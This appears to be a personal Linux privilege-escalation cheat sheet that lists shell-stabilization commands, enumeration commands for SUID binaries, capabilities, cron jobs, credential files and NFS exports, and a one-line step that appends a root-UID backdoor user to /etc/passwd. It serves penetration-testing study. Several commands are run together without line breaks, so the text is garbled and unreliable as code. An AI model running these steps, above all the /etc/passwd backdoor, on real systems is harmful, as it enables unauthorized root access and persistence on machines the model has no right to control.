# Path to Root

### **Shell Stabilization**

```powershell
python -c 'import pty;pty.spawn("/bin/bash")' #OR
python3 -c 'import pty;pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
Ctrl + Z #Background Process
stty raw -echo ; fg ; 
reset
stty columns 200 rows 200
```

### Manual Enumeration

```powershell
#check basic info on the system
which 
    gcc
    cc
    python
    perl
    wget
    curl
    fetch
    nc
    ncat
    nc.traditional
    socatCompilation

uname -a
cat /etc/issue 
cat /etc/*-release
sudo -lls -lsaht /etc/sudoers
groups <user>
cd /home/ls -la #find users
find / -perm -u=s -type f 2>/dev/null #Find SUIDS we can use
find / -perm -g=s -type f 2>/dev/null #Find GUIDS we can use
ls -la /var/www/html/ #Check for files containing creds

#what does the network look like?
netstat -antup
netstat -tunlp

#find all files created by our user
find / -user {username} 2>/dev/null

#any capabilites we can exploit?
getcap -r / 2>/dev/null

#any services running as root?
ps aux |grep -i 'root' --color=auto

mysql -uroot -p

#anything in /etc/ at our user level?
ls -la /etc

#any config files left behind?
ls -lsaht |grep -i ‘.conf’ --color=auto

#any secret files?
ls -lsaht |grep -i ‘.secret’ --color=auto

#any SSH files we can mess with?
ls -lsaR /home/

#do we have file transfer capabilities?
ls -lsaht /bin/ |grep -i 'ftp' --color=auto

ls -lsaht #take a look at these folders for weird shit
    /var/lib
    /var/db
    /opt/
    /tmp/
    /var/tmp/
    /dev/shm/

#cronjobs
cat /etc/crontab
ls -la /etc/cron
crontab -u root -l

#can we exploit weak NFS Permissions?
cat /etc/exports #no_root_squash

#can we write to /etc/password?
openssl passwd -1haxor$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.echo 'alien:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:alien:/home/alien:/bin/bash' >> /etc/passwdsu alienid

#need to add port forwarding
#need to add NFS mounting
```

[https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)

**SUID/GUID/SUDO **_**Escalation**_**:** [https://gtfobins.github.io/](https://gtfobins.github.io/)

**Binary/Languages with "**_**Effective Permitted**_**" or "**_**Empty Capability**_**"** [https://www.insecure.ws/linux/getcap\_setcap.html#getcap-setcap-and-file-capabilities](https://www.insecure.ws/linux/getcap\_setcap.html#getcap-setcap-and-file-capabilities)

**NFS? Can we exploit weak NFS Permissions?cat /etc/exports no\_root\_squash?**
